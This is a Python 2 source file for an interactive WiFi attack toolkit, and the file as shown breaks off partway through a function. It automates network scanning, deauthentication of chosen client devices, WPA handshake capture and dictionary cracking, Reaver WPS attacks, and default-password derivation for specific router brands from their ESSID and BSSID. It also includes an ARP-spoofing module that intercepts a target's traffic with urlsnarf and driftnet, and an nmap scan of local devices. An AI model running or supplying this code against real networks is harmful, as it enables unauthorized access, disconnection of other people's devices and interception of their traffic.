import re, os, sys, time, urllib3
import GenPwdList, TColors

TColors = TColors.TColors(); Colors = TColors.Colors

class AirCrack:
    def __init__(self):
        pass

    def SelectInterface(self):
        while True:
            os.system("airmon-ng | grep wlan > airmon-ng.txt")
            airmon_txt = open("airmon-ng.txt", "r"); os.system("rm airmon-ng.txt")
            wlanx_interfaces = []; MaxChipLen = 0
            for line in airmon_txt:
                data = line.split()
                if len(" ".join(data[3:])) > MaxChipLen: MaxChipLen = len(" ".join(data[3:]))
                wlanx_interfaces.append([data[1], data[2], " ".join(data[3:])])
            print
            print "  %s %-10s %-12s %s" % ("#", "Interface", "   Driver   ", " Chipset ")
            print "  %s %-10s %-12s %s" % ("-", "-" * 10, "-" * 12, "-" * MaxChipLen)
            for i in range(len(wlanx_interfaces)):
                print "  %s %-10s %-12s %s" % (i + 1, " " + wlanx_interfaces[i][0], " " + wlanx_interfaces[i][1], wlanx_interfaces[i][2])
            print
            try: return wlanx_interfaces[int(raw_input("Select Wireless Interface: ")) - 1][0]
            except IndexError: print "\nWireless Interface Does Not Exist...\n"
            except KeyboardInterrupt: return False
            except ValueError: print "\nInvalid Input...\n"

    def ScanNetworks(self, wlanx):
        if not wlanx: return False
        wlanxmon = wlanx
        if "mon" not in wlanx: os.system("airmon-ng start %s > /dev/null 2>&1" % wlanx); wlanxmon = wlanx + "mon"
        print "\nScanning For Wireless Networks...\n\nPress CTRL+C To Stop Scannning...\n"
        os.system("airodump-ng %s --output-format cap,netxml -w listener; mv listener-01.cap 'captures/%s.cap'" % (wlanxmon, time.ctime()))
        return "listener-01.kismet.netxml"

    def AirSniff(self, wlanx):
        if not wlanx: return False
        wlanxmon = wlanx
        if "mon" not in wlanx: os.system("airmon-ng start %s > /dev/null 2>&1" % wlanx); wlanxmon = wlanx + "mon"
        while True:
            timestamp = time.ctime()
            print "\nScanning For Wireless Networks...\n\nPress CTRL+C To Stop Scannning...\n"
            os.system("airodump-ng %s --output-format cap,netxml -w listener;" % wlanxmon)
            os.system("mv listener-01.cap 'captures/%s.cap';" % timestamp)
            os.system("mv listener-01.kismet.netxml 'netxml/%s.kismet.netxml'" % timestamp)
            try: raw_input("Press CTRL+C to quit, else press ENTER to loop again.")
            except KeyboardInterrupt: return False

    def NetXML_Parser(self, netxml):
        ScannedNetworks = re.findall(re.compile("<wireless-network (.*?)</wireless-network>"), " ".join(open(netxml, "r").read().split()))
        os.system("rm listener* > /dev/null 2>&1")
        WirelessNetworks = []; UniqueBSSID = []
        for ScannedNetwork in ScannedNetworks:
            SSID = re.findall(re.compile("<SSID (.*?)</SSID>"), ScannedNetwork)[0] if re.findall(re.compile("<SSID (.*?)</SSID>"), ScannedNetwork) else ""
            Encryption = re.findall(re.compile("<encryption>(.*?)</encryption>"), SSID)
            Encryption = "Open" if len(Encryption) == 1 else Encryption[0] if len(Encryption) > 1 else "Open"
            Encr = Encryption.split("+")[0] + "2" if "+" in Encryption else Encryption
            Auth = Encryption.split("+")[1] if "+" in Encryption else "None" if Encryption == "WEP" else "Open"
            Encryption = Encr
            CheckWPS = "wps" if Auth == "TKIP" else "none"
            ESSID = re.findall(re.compile('<essid cloaked="(.*?)">'), ScannedNetwork)
            ESSID = re.findall(re.compile('<essid cloaked="false">(.*?)</essid>'), ScannedNetwork)[0] if ESSID and ESSID[0] == "false" else "(Hidden Network)"
            BSSID = re.findall(re.compile("<BSSID>(.*?)</BSSID>"), ScannedNetwork)[0].upper()
            Manuf = re.findall(re.compile("<manuf>(.*?)</manuf>"), ScannedNetwork)[0]
            Channel = re.findall(re.compile("<channel>(.*?)</channel>"), ScannedNetwork)[0]; Channel = " " + Channel if len(Channel) == 1 else Channel
            Signal = re.findall(re.compile("<last_signal_dbm>(.*?)</last_signal_dbm>"), ScannedNetwork)[0]; Signal = "-100" if Signal == "0" else Signal
            ScannedClients = re.findall(re.compile("<wireless-client (.*?)</wireless-client>"), ScannedNetwork)
            ClientMACs = []; ClientManufs = []; Clients = " 0"
            if ScannedClients:
                Clients = " " + str(len(ScannedClients)) if len(ScannedClients) < 10 else str(len(ScannedClients))
                for ScannedClient in ScannedClients:
                    ClientMACs.append(re.findall(re.compile("<client-mac>(.*?)</client-mac>"), ScannedClient))
                    ClientManufs.append(re.findall(re.compile("<client-manuf>(.*?)</client-manuf>"), ScannedClient))
            if BSSID not in UniqueBSSID:
                UniqueBSSID.append(BSSID)
                WirelessNetworks.append({
                    "Auth": Auth, "BSSID": BSSID, "Channel" : Channel, "CheckWPS": CheckWPS,
                    "ClientMACs": ClientMACs, "ClientManufs": ClientManufs, "Clients": Clients,
                    "Encryption": Encryption, "ESSID": ESSID, "Manuf": Manuf, "Signal": Signal
                })
        WirelessNetworks = sorted(WirelessNetworks, key = lambda x: int(x["Signal"]))[::-1] if WirelessNetworks else WirelessNetworks
        return WirelessNetworks

    def Select_NetXMLs(self):
        os.system("find . -type f -name *.netxml > netxml.txt")
        netxml_paths = []; maxChar = 20
        netxml = open("netxml.txt", "r")
        for line in netxml:
            path = line.split("/")[2:]
            if len("/".join(path).replace("\n", "")) >= maxChar: maxChar = len("/".join(path).replace("\n", ""))
            if len(path) == 1: netxml_paths.append(path[0].replace("\n", ""))
            elif len(path) == 2: netxml_paths.append(path[0] + "/" + path[1].replace("\n", ""))
            elif len(path) == 3: netxml_paths.append(path[0] + "/" + path[1] + "/" + path[2].replace("\n", ""))
        os.system("rm netxml.txt")
        print "\n     -------- KismetNetXML Parser --------     \n"
        print "  %-3s  %s" % ("---", "-" * maxChar)
        for i in range(len(netxml_paths)):
            print "  %-3s  %s" % (str(i + 1) + ".", netxml_paths[i])
        print
        netxmls = []
        for index in raw_input("Enter Options [Separate by Commas]: ").split(","):
            try:
                i = int(re.sub("[^0-9]", "", index)) - 1
                if i in range(len(netxml_paths)): netxmls.append("netxml/" + netxml_paths[i])
            except: pass
        return list(set(netxmls))

    def SortNetworks(self, WirelessNetworks):
        if not WirelessNetworks: return False
        print """
        \t%s Networks Found, Sort By...?\n
          %-3s Signal Strength (Default)
          %-3s Network Name (ESSID)
          %-3s Channel Number
          %-3s Encryption (OPEN/WPA2)
          %-3s Access Point (BSSID)
          %-3s Authentication Type (NONE/PSK/MGT)
          %-3s WPS Available?
          %-3s Length of ESSID
          %-3s Number of Client(s)
          %-3s Router Manufacturer\n
          """ % tuple([len(WirelessNetworks)] + ["%s." % i for i in range(1, 11)])
        try:
            i = raw_input("Select Sorting Option: ")
            if i == "1": return sorted(WirelessNetworks, key = lambda x: int(x["Signal"].split()[0]))[::-1]
            if i == "2": return sorted(WirelessNetworks, key = lambda x: x["ESSID"])
            if i == "3": return sorted(WirelessNetworks, key = lambda x: int(x["Channel"]))
            if i == "4": return sorted(WirelessNetworks, key = lambda x: x["Encryption"])
            if i == "5": return sorted(WirelessNetworks, key = lambda x: x["BSSID"])
            if i == "6": return sorted(WirelessNetworks, key = lambda x: x["Auth"])
            if i == "7": return sorted(WirelessNetworks, key = lambda x: x["CheckWPS"])[::-1]
            if i == "8": return sorted(WirelessNetworks, key = lambda x: len(x["ESSID"]))
            if i == "9": return sorted(WirelessNetworks, key = lambda x: x["Clients"])[::-1]
            if i == "10": return sorted(WirelessNetworks, key = lambda x: x["Manuf"])
            if not i:
                print "\n\tInvalid Input... Sorting Networks by Signal Strength (Default)...\n"
                return WirelessNetworks
            return False
        except: return False

    def SelectNetwork(self, WirelessNetworks):
        if not WirelessNetworks: return False
        SortedNetworks = WirelessNetworks
        while True:
            if SortedNetworks:
                print "\n\t----- Select WiFi Network -----\n"
                if "pi" in sys.argv:
                    print " %-3s %-20s %-4s %-4s %-4s %-2s %-18s" % (" # ", "Network Name (ESSID)", "PWR!", "ENCR", "WPS?", "CL", "Possible Password")
                    print " %-3s %-20s %-4s %-4s %-4s %-2s %-18s" % ("-" * 3, "-" * 20, "-" * 4, "-" * 4, "-" * 4, "-" * 2, "-" * 18)
                else:
                    print " %-3s %-20s %-2s %-4s %-4s %-19s %-4s %-4s %-2s %-24s %-18s" % (
                        " # ", "Network Name (ESSID)", "CH", "PWR!", "ENCR",
                        "MAC Address (BSSID)", "AUTH", "WPS?", "CL", "Router Manufacturer", "Possible Password")
                    print " %-3s %-20s %-2s %-4s %-4s %-19s %-4s %-4s %-2s %-24s %-18s" % (
                        "-" * 3, "-" * 20, "-" * 2, "-" * 4, "-" * 4,
                        "-" * 19, "-" * 4, "-" * 4, "-" * 2, "-" * 24, "-" * 18)
                for i in range(0, len(SortedNetworks)):
                    ESSID = SortedNetworks[i]["ESSID"]; BSSID = SortedNetworks[i]["BSSID"]
                    Channel = SortedNetworks[i]["Channel"]
                    Pwr = SortedNetworks[i]["Signal"]; Encryption = SortedNetworks[i]["Encryption"]
                    Auth = SortedNetworks[i]["Auth"]; CheckWPS = SortedNetworks[i]["CheckWPS"]
                    Clients = SortedNetworks[i]["Clients"]
                    if "pi" in sys.argv:
                        print " %s%-3s%s %s%-20s%s %s%-4s%s %s%-4s%s %s%-4s%s %s%-2s%s %s%-18s%s" % (
                            Colors["yellow"], i + 1, Colors["end"],
                            Colors["cyan"], ESSID[:20], Colors["end"],
                            Colors["green"] if int(Pwr) >= -70 else Colors["yellow"] if int(Pwr) >= -80 else Colors["red"], Pwr, Colors["end"],
                            Colors["cyan"] if Encryption == "WPA2" else Colors["green"], Encryption, Colors["end"],
                            Colors["green"] if CheckWPS == "wps" else Colors["red"], CheckWPS, Colors["end"],
                            Colors["green"] if int(Clients) else Colors["red"], Clients, Colors["end"],
                            Colors["yellow"], RouterPwn().Crack_WPA_WEP_Key(BSSID, ESSID), Colors["end"])
                    else:
                        print " %s%-3s%s %s%-20s%s %s%-2s%s %s%-4s%s %s%-4s%s %s%-19s%s %s%-4s%s %s%-4s%s %s%-2s%s %s%-24s%s %s%-18s%s" % (
                            Colors["yellow"], i + 1, Colors["end"],
                            Colors["cyan"], ESSID[:20], Colors["end"],
                            Colors["blue"], Channel, Colors["end"],
                            Colors["green"] if int(Pwr) >= -70 else Colors["yellow"] if int(Pwr) >= -80 else Colors["red"], Pwr, Colors["end"],
                            Colors["cyan"] if Encryption == "WPA2" else Colors["green"], Encryption, Colors["end"],
                            Colors["magenta"], " " + BSSID, Colors["end"],
                            Colors["yellow"] if Auth == "TKIP" else Colors["red"] if Auth == "MGT" else Colors["cyan"] if Auth == "PSK" else Colors["green"], Auth, Colors["end"],
                            Colors["green"] if CheckWPS == "wps" else Colors["red"], CheckWPS, Colors["end"],
                            Colors["green"] if int(Clients) else Colors["red"], Clients, Colors["end"],
                            Colors["blue"], SortedNetworks[i]["Manuf"][:24], Colors["end"],
                            Colors["yellow"], RouterPwn().Crack_WPA_WEP_Key(BSSID, ESSID), Colors["end"])
                try: return SortedNetworks[int(raw_input("\nSelect WiFi Network #: ")) - 1]
                except IndexError: SortedNetworks = self.SortNetworks(SortedNetworks)
                except KeyboardInterrupt: return False
                except ValueError: SortedNetworks = self.SortNetworks(SortedNetworks)
            else: return False

    def DeviceListener(self, wlanxmon, BSSID, Channel):
        os.system("airodump-ng -c %s --bssid %s --output-format netxml -w devices %s" % (Channel, BSSID, wlanxmon))
        netxml = " ".join(open("devices-01.kismet.netxml").read().split()); os.system("rm devices*")
        ClientMACs = re.findall(re.compile("<client-mac>(.*?)</client-mac>"), netxml)
        ClientManufs = re.findall(re.compile("<client-manuf>(.*?)</client-manuf>"), netxml)
        print "\n\tMy Device MAC - %s\n" % MyNetwork().MyDeviceMAC()
        print " %-3s %-17s %s" % (" # ", "   MAC Address   ", " Device Manufacturer ")
        print " %-3s %-17s %s" % ("-" * 3, "-" * 17 , "-" * 36)
        print
        for i in range(len(ClientMACs)):
            print " %-3s %17s %s" % (str(i + 1) + ".", ClientMACs[i], " " + ClientManufs[i])
        print
        try:
            if "Y" in raw_input("Would You Like To Kick Some Devices? [Y/N]: ").upper():
                RawDeviceIndexes = raw_input("Select Device(s) # [Separate by Comma || 'all']: "); DeviceIndexes = []
                if "ALL" in RawDeviceIndexes.upper(): DeviceIndexes = range(len(ClientMACs))
                if "ALL" not in RawDeviceIndexes.upper():
                    for i in RawDeviceIndexes.split(","):
                        if i.isdigit() and int(i) - 1 < len(ClientMACs): DeviceIndexes.append(int(i) - 1)
                if DeviceIndexes:
                    PayloadCount = raw_input("Enter Payload Count (Max: 30): ")
                    if PayloadCount and PayloadCount.isdigit() and int(PayloadCount):
                        PayloadCount = 30 if int(PayloadCount) >= 30 else int(PayloadCount)
                    else: return False
                    print
                    for i in range(PayloadCount):
                        for index in DeviceIndexes:
                            os.system("aireplay-ng -0 2 -a %s -c %s %s" % (BSSID, ClientMACs[index], wlanxmon))
        except: return False
        return True

    def HandshakeHarvest(self, wlanx):
        if not wlanx: return False
        wlanxmon = wlanx
        if "mon" not in wlanx: os.system("airmon-ng start %s > /dev/null 2>&1" % wlanx); wlanxmon = wlanx + "mon"
        print "\nScanning For Target Devices...\n\nPress CTRL+C To Stop Scannning...\n"
        WirelessNetworks = self.NetXML_Parser(self.ScanNetworks(wlanx))
        NetworksWithClients = []
        for WirelessNetwork in WirelessNetworks:
            if int(WirelessNetwork["Clients"]) and WirelessNetwork["BSSID"] not in str(NetworksWithClients): NetworksWithClients.append(WirelessNetwork)
        NetworksWithClients = sorted(NetworksWithClients, key = lambda x: x["Clients"])[::-1]
        TargetNetwork = self.SelectNetwork(NetworksWithClients)
        if not TargetNetwork: return False
        BSSID = TargetNetwork["BSSID"]; Channel = TargetNetwork["Channel"]; ESSID = TargetNetwork["ESSID"]
        print; print;
        if os.path.isfile("handshakes/%s.cap" % re.sub("[^0-9A-F]", "", BSSID)):
            if "Y" not in raw_input("\t'%s.cap' already exists... Continue?: " % re.sub("[^0-9A-F]", "", BSSID)).upper(): return False
        self.DeviceListener(wlanxmon, BSSID, Channel)
        os.system("airodump-ng -c %s --bssid %s --output-format cap -w handshakes/%s %s" % (Channel, BSSID, re.sub("[^0-9A-F]", "", BSSID), wlanxmon))
        os.system("aircrack-ng -a2 -w 'wordlists/default.txt' handshakes/%s-01.cap > handshakes/aircrack.txt" % re.sub("[^0-9A-F]", "", BSSID))
        if "No valid WPA handshakes found." in open("handshakes/aircrack.txt", "r").read(): print "\nNo valid WPA handshakes found\n"
        elif "No networks found, exiting." in open("handshakes/aircrack.txt", "r").read(): print "\nNo networks found, exiting.\n"
        else: os.system("mv handshakes/%s-01.cap handshakes/%s.cap" % (re.sub("[^0-9A-F]", "", BSSID), re.sub("[^0-9A-F]", "", BSSID)))
        os.system("rm handshakes/%s-* handshakes/aircrack.txt > /dev/null 2>&1" % re.sub("[^0-9A-F]", "", BSSID))
        return True

    def WiFi_CrackMenu(self, SelectedNetwork):
        if not SelectedNetwork: return False
        wlanx = SelectedNetwork["WirelessInterface"][0]; wlanxmon = SelectedNetwork["WirelessInterface"][1]
        BSSID = SelectedNetwork["BSSID"]; Channel = SelectedNetwork["Channel"]; Signal = SelectedNetwork["Signal"]
        Encryption = SelectedNetwork["Encryption"]; ESSID = SelectedNetwork["ESSID"]; Auth = SelectedNetwork["Auth"]
        CheckWPS = SelectedNetwork["CheckWPS"]; Clients = SelectedNetwork["Clients"]; Manuf = SelectedNetwork["Manuf"];
        ClientMACs = SelectedNetwork["ClientMACs"]; ClientManufs = SelectedNetwork["ClientManufs"]
        while True:
            print "\n\t----- WiFi Cracker Method -----\n"
            print " 1. Generic Router Algorithm"
            print " 2. Reaver v1.5.3 WPS Attack Tool"
            print " 3. AirCrack (Coming Soon)"
            print "\n 9. Go Back\n"
            try:
                x = raw_input("Select WiFi Cracker Method Option: ")
                if x == "1":
                    if RouterPwn().CheckPrefix(ESSID):
                        RouterPwn().CreateProfilesDir()
                        WPA_WEP_Key = RouterPwn().Crack_WPA_WEP_Key(BSSID, ESSID)
                        yes_no = raw_input("\nConnect To This Network (Default: No)? [Y/N]: ")
                        if "Y" in yes_no.upper():
                            if os.path.exists("profiles/%s.conf" % ESSID.replace(" ", "_").replace("-", "_")):
                                yes_no = raw_input("WiFi Profile Already Exists... Use Profile? [Y/N]: ")
                                if "Y" in yes_no.upper():
                                    WPA_WEP_Key = re.findall(re.compile(r'\"(.*?)\"'), " ".join(open("profiles/%s.conf" % ESSID.replace(" ", "_").replace("-", "_")).read().split()))[1]
                                    print "\n%s\n" % WPA_WEP_Key
                                else:
                                    yes_no = raw_input("WiFi Profile Already Exists... Overwrite? [Y/N]: ")
                                    if "Y" not in yes_no.upper(): return
                            print "\n\tConnecting To Internet w/ Following Parameters:\n"
                            print "Wireless Interface: %s%s%s" % (Colors["yellow"], wlanx, Colors["end"])
                            print "Network Name (ESSID): %s%s%s" % (Colors["blue"], ESSID, Colors["end"])
                            print "Access Point (BSSID): %s%s%s" % (Colors["magenta"], BSSID, Colors["end"])
                            print "WPA Key/Password: %s%s%s" % (Colors["cyan"], WPA_WEP_Key, Colors["end"])
                            os.system("airmon-ng stop %s > airmon_stop.txt; rm airmon_stop.txt" % wlanxmon)
                            if RouterPwn().Test_WPA_WEP_Key(wlanx, BSSID, ESSID, Encryption, WPA_WEP_Key): print "\n%sSuccessfully Connected...%s\n" % (Colors["green"], Colors["end"]); quit()
                            os.system("airmon-ng start %s > airmon_start.txt; rm airmon_start.txt" % wlanx)
                    else:
                        print "\n\t%sNot A Generic Router...%s" % (Colors["red"], Colors["end"])
                elif x == "2": print; os.system("reaver -c %s -i %s -b %s -w -K 1 -L -vv" % (Channel, wlanxmon, BSSID)); print
                elif x == "3":
                    wordlist = "default.txt"
                    if "ATT-WIFI-" in ESSID:
                        GenPwdList.ATT_WIFI(ESSID[-4:])
                        wordlist = ESSID.replace(" ", "_").replace("-", "_") + ".txt"
                    if ESSID[:7] in ["TG1672G", "TC8717T", "TC8715D", "DG1670A"]:
                        GenPwdList.ArrisRouter(ESSID)
                        wordlist = ESSID + ".txt"
                    if ESSID[:4] == "WIFI" and len(ESSID) == 10:
                        GenPwdList.WIFIXXXXXX(BSSID, ESSID)
                        wordlist = ESSID + ".txt"
                    if AirCrack().DeviceListener(wlanxmon, BSSID, Channel):
                        os.system("airodump-ng -c %s --bssid %s --output-format cap -w crack %s" % (Channel, BSSID, wlanxmon))
                        os.system("aircrack-ng -a2 -b %s -w 'wordlists/%s' crack-01.cap" % (BSSID, wordlist))
                    os.system("rm *.cap")
                elif not x: pass
                else: return False
            except KeyboardInterrupt: return False

    def WirelessOptions(self, SelectedNetwork):
        if not SelectedNetwork: return False
        wlanx = self.SelectInterface()
        if not wlanx: return False
        if "mon" not in wlanx: os.system("airmon-ng start %s > /dev/null 2>&1" % wlanx)
        wlanx = wlanx.replace("mon", ""); wlanxmon = wlanx + "mon"
        SelectedNetwork.update({"WirelessInterface": [wlanx, wlanxmon]})
        BSSID = SelectedNetwork["BSSID"]; Channel = SelectedNetwork["Channel"]; Signal = SelectedNetwork["Signal"]
        Encryption = SelectedNetwork["Encryption"]; ESSID = SelectedNetwork["ESSID"]; Auth = SelectedNetwork["Auth"]
        CheckWPS = SelectedNetwork["CheckWPS"]; Clients = SelectedNetwork["Clients"]; Manuf = SelectedNetwork["Manuf"];
        ClientMACs = SelectedNetwork["ClientMACs"]; ClientManufs = SelectedNetwork["ClientManufs"]
        while True:
            print "\n%s\n" % ("-" * (len(ESSID) + len(BSSID) + 30))
            print "----- ESSID: %s || BSSID: %s -----   " % (Colors["cyan"] + ESSID + Colors["end"], Colors["magenta"] + BSSID + Colors["end"])
            print "\n%s----- WiFi Options -----\n" % (" " * (len(ESSID) / 2 + 12))
            print " 1. Listen For Connected Devices (Default)"
            print " 2. Connect To WiFi Network"
            print " 3. Crack WiFi Password"
            print; print " 9. Go Back"; print
            try:
                x = raw_input("Select WiFi Option: ")
                if x == "1": AirCrack().DeviceListener(wlanxmon, BSSID, Channel)
                elif x == "2":
                    yes_no = raw_input("Connect To WiFi Network '%s%s%s' ? [Y/N]: " % (Colors["blue"], ESSID, Colors["end"]))
                    if "Y" in yes_no.upper():
                        RouterPwn().CreateProfilesDir(); WPA_WEP_Key = None
                        if os.path.exists("profiles/%s.conf" % ESSID.replace(" ", "_").replace("-", "_")):
                            yes_no = raw_input("WiFi Profile Already Exists... Use Profile? [Y/N]: ")
                            if "Y" in yes_no.upper():
                                if Encryption == "Open": WPA_WEP_Key = None
                                else: WPA_WEP_Key = re.findall(re.compile(r'\"(.*?)\"'), " ".join(open("profiles/%s.conf" % ESSID.replace(" ", "_").replace("-", "_")).read().split()))[1]
                            else:
                                yes_no = raw_input("WiFi Profile Already Exists... Overwrite? [Y/N]: ")
                                if "Y" in yes_no.upper():
                                    if Encryption == "Open": WPA_WEP_Key = None
                                    else:
                                        WPA_WEP_Key = raw_input("Enter WPA/WEP Key/Password: ")
                                        while len(WPA_WEP_Key) < 8:
                                            WPA_WEP_Key = raw_input("Enter WPA/WEP Key/Password: ")
                                else: return
                        else:
                            WPA_WEP_Key = raw_input("Enter WPA/WEP Key/Password: ")
                            while len(WPA_WEP_Key) < 8:
                                WPA_WEP_Key = raw_input("Enter WPA/WEP Key/Password (Must be at least 8 char): ")

                        print "\n\tConnecting To Internet w/ Following Parameters:\n"
                        print "Wireless Interface: %s%s%s" % (Colors["yellow"], wlanx, Colors["end"])
                        print "Network Name (ESSID): %s%s%s" % (Colors["blue"], ESSID, Colors["end"])
                        print "Access Point (BSSID): %s%s%s" % (Colors["magenta"], BSSID, Colors["end"])
                        print "WPA Key/Password: %s%s%s" % (Colors["cyan"], WPA_WEP_Key, Colors["end"])
                        os.system("airmon-ng stop %s > airmon_stop.txt; rm airmon_stop.txt" % wlanxmon)
                        if RouterPwn().Test_WPA_WEP_Key(wlanx, BSSID, ESSID, Encryption, WPA_WEP_Key):
                            print "\n%sSuccessfully Connected...%s\n" % (Colors["green"], Colors["end"]); quit()
                        os.system("airmon-ng start %s > airmon_start.txt; rm airmon_start.txt" % wlanx)
                elif x == "3": self.WiFi_CrackMenu(SelectedNetwork)
                elif not x: pass
                else: self.WirelessOptions(self.SelectNetwork(self.SortNetworks(self.NetXML_Parser(self.ScanNetworks(wlanxmon)))))
            except KeyboardInterrupt: return False

class ArpSpoof:
    def Attack(self, wlanx, Target_Device):
        Local_IP = Target_Device["Local_IP"]
        RouterAddress = Target_Device["RouterAddress"]
        Client = Target_Device["Client"]
        os.system("echo $DESKTOP_SESSION > desktop.txt")
        checkGnome = open("desktop.txt", "r").read()
        if checkGnome.split()[0] != "gnome":
            print "\nSorry, Requires Gnome Desktop Enviromenet\n"; return False
        print "\nAttacking Target %s - %s ...\n" % (Local_IP, Client)
        raw_input("Enter To Continue...")
        os.system("gnome-terminal -x arpspoof -i %s -t %s %s" % (wlanx, RouterAddress, Local_IP))
        raw_input("Enter To Continue...")
        os.system("gnome-terminal -x arpspoof -i %s -t %s %s" % (wlanx, Local_IP, RouterAddress))
        raw_input("Enter To Continue...")
        os.system("gnome-terminal -x urlsnarf -i %s" % wlanx)
        raw_input("Enter To Continue...")
        os.system("gnome-terminal -x driftnet -i %s" % wlanx)

class MyNetwork:
    def BSSID(self, wlanx):
        if not wlanx or "mon" in wlanx: return ""
        os.system("iwconfig %s | grep 'Access Point' > iwconfig.txt" % wlanx)
        iwconfig = " ".join(open("iwconfig.txt", "r").read().split()); os.system("rm iwconfig.txt")
        return iwconfig.split()[-1] if "NOT" not in iwconfig else ""

    def ESSID(self, wlanx):
        if not wlanx or "mon" in wlanx: return ""
        os.system("iwconfig %s | grep ESSID > iwconfig.txt" % wlanx)
        iwconfig = " ".join(open("iwconfig.txt", "r").read().split()); os.system("rm iwconfig.txt")
        return re.findall(re.compile('\"(.*?)\"'), iwconfig)[0] if len(re.sub("[^\"]", "", iwconfig)) == 2 else ""

    def Local_IP(self, wlanx):
        if not wlanx or "mon" in wlanx: return ""
        os.system("ifconfig %s | grep inet.*broadcast > ifconfig.txt" % wlanx)
        ifconfig = open("ifconfig.txt", "r").read(); os.system("rm ifconfig.txt")
        return ifconfig.split()[1] if "inet" in ifconfig else ""

    def Local_Devices(self, wlanx):
        if not wlanx or "mon" in wlanx: return ""
        print  "\n\tObtaining Network Info...\n"
        ESSID = self.ESSID(wlanx)
        print "    Network Name (ESSID):", ESSID
        BSSID = self.BSSID(wlanx);
        print "    MAC Address (BSSID):", BSSID
        Public_IP = self.Public_IP()
        if Public_IP: print "    Public I.P. Address:", Public_IP
        else: print "Slow or No Connection..."; return False
        if not ESSID or not BSSID:
            print "\nNot Connected To Any Network\n"; return ""
        print
        print "  %-3s %-42s %-15s %-19s %-10s %-8s %s" % (" # ", "          Client or Manufacturer          ", " Local Address ", "MAC Address (BSSID)", "  Port #  ", " Status ", "     Service     ")
        print "  %-3s %-42s %-15s %-19s %-10s %-8s %s" % ("-" * 3,"-" * 42, "-" * 15, "-" * 19, "-" * 10, "-" * 8, "-" * 17)
        os.system("arp-scan -l -I %s | grep %s > LocalDevices.txt" % (wlanx, self.Local_IP(wlanx).split(".")[0]))
        LocalDevices = open("LocalDevices.txt", "a")
        LocalDevices.write("%s %s %s\n" % (self.Local_IP(wlanx), self.MyDeviceMAC(), self.MyDeviceName()))
        LocalDevices.close()
        LocalDevices = open("LocalDevices.txt", "r")
        SortedLocalDevices = open("SortedLocalDevices.txt", "w")
        for line in sorted(LocalDevices, key = lambda x: int(x.split()[0].split(".")[3])):
            SortedLocalDevices.write(line)
        SortedLocalDevices.close()
        Organization = "(Unknown)"
        os.system("nohup whois %s > whois.txt 2>&1" % Public_IP); whois = open("whois.txt", "r")
        for line in whois:
            if line.split() and line.split()[0] == "Organization:": Organization = " ".join(line.split()[1:])
        SortedLocalDevices = open("SortedLocalDevices.txt", "r")
        AppendPublicIPInfo = "%s %s %s\n" % (Public_IP, BSSID, Organization)
        NewSortedDevices = open("NewSortedDevices.txt", "w")
        for line in SortedLocalDevices:
            NewSortedDevices.write(line)
        NewSortedDevices.write(AppendPublicIPInfo)
        SortedLocalDevices.close(); NewSortedDevices.close()
        NewSortedDevices = open("NewSortedDevices.txt", "r")
        Local_Devices = []; DeviceIndex = 0
        for line in NewSortedDevices:
            DeviceInfo = line.split()
            Local_IP = DeviceInfo[0]; MAC_Address = DeviceInfo[1].upper(); Client = " ".join(DeviceInfo[2:])
            if Local_IP not in str(Local_Devices):
                os.system("nmap -T4 %s | grep 'open\|filtered\|MAC' > nmap_%s.txt" % tuple([Local_IP] * 2))
                nmap_txt = open("nmap_%s.txt" % Local_IP, "r")
                OpenPorts = []; FilteredPorts = []
                for line in nmap_txt:
                    if "MAC" in line: Client = re.sub("[()]", "", " ".join(line.split()[3:])) if "(" in line and ")" in line else Client
                    if "open" in line: OpenPorts.append(line.split())
                    if "filtered" in line and len(line.split()) == 3: FilteredPorts.append(line.split())
                Local_Devices.append({"Local_IP": Local_IP, "MAC_Address": MAC_Address, "Client": Client, "Ports": {"Open": OpenPorts, "Filtered": FilteredPorts}})
                AllPorts = OpenPorts + FilteredPorts
                NonDuplicates =[]
                DeviceOptionNum = str(DeviceIndex + 1) + "."
                if len(DeviceOptionNum) == 1: DeviceOptionNum = " " + DeviceOptionNum
                if not AllPorts:
                    print "  %-3s %-42s %-15s %-19s" % (DeviceOptionNum, Client[:42], Local_IP, " %s " % MAC_Address)
                for i in range(len(AllPorts)):
                    if Local_IP not in NonDuplicates:
                        NonDuplicates.append(Local_IP)
                        print "  %-3s %-42s %-15s %-19s %-10s %-8s %s" % (DeviceOptionNum, Client[:42], Local_IP, " %s " % MAC_Address, AllPorts[i][0], AllPorts[i][1], AllPorts[i][2])
                    else:
                        print "  %-82s %-10s %-8s %s" % ("", AllPorts[i][0], AllPorts[i][1], AllPorts[i][2])
                DeviceIndex += 1
        os.system("rm *.txt")
        return Local_Devices

    def Select_Local_Device(self, Local_Devices):
        try:
            print
            i = int(raw_input("Select Device: ")) - 1
            if i >= len(Local_Devices) or i <= 0: return False
            Local_Devices[i].update({"RouterAddress": Local_Devices[0]["Local_IP"]})
            return Local_Devices[i]
        except KeyboardInterrupt:
            print; print
        except ValueError:
            print "\nInvalid Input...\n"
        return False

    def MyDeviceMAC(self):
        os.system("ethtool -P eth0 > eth0.txt")
        eth0 = open("eth0.txt", "r").read(); os.system("rm eth0.txt")
        return eth0.split()[-1].upper()

    def MyDeviceName(self):
        os.system("echo $(uname -n) $(uname -s) > uname.txt")
        uname = open("uname.txt", "r").read(); os.system("rm uname.txt")
        return " ".join(uname.split()).title() + " (This Device)"

    def Public_IP(self):
        try:
            return urllib3.PoolManager().request("GET", "http://RichardCazales.com/MyIP").data.decode("UTF-8").split()[0]
        except urllib3.exceptions.MaxRetryError:
            print "\n%sConnection Timeout, No Internet :(%s\n" % (Colors["red"], Colors["end"])
        except:
            pass
        return False

class RouterPwn:
    def CheckPrefix(self, ESSID):
        prefixes = ["Belkin.", "belkin." "DDW3611", "DG1670A", "DG860A", "SBG6580", "TC8715D", "TC8717T", "TG1672G", "TG852G", "TP-LINK_"]
        i = False
        for prefix in prefixes:
            if prefix in ESSID: i = True
        # print i
        return i

    def Crack_WPA_WEP_Key(self, BSSID, ESSID):
        if not self.CheckPrefix(ESSID): return ""
        ConversionChart = ["0123456789ABCDEF", "944626378ace9bdf"]; WPA_WEP_Key = ""
        if len(ESSID) == 8: WPA_WEP_Key = ESSID[:6] + "".join(BSSID.split(":")[3:])
        elif len(ESSID) == 9: WPA_WEP_Key = ESSID[:7] + "".join(BSSID.split(":")[3:]) if "DDW" in ESSID or "SBG" in ESSID else ESSID[:7] + "".join(BSSID.split(":")[3:5]) + ESSID[-2:]
        elif len(ESSID) == 10:
            MAC8 = BSSID.split(":")[-4:]; MAC8[3] = hex(int(MAC8[3], base=16) + 1)[2:].upper()
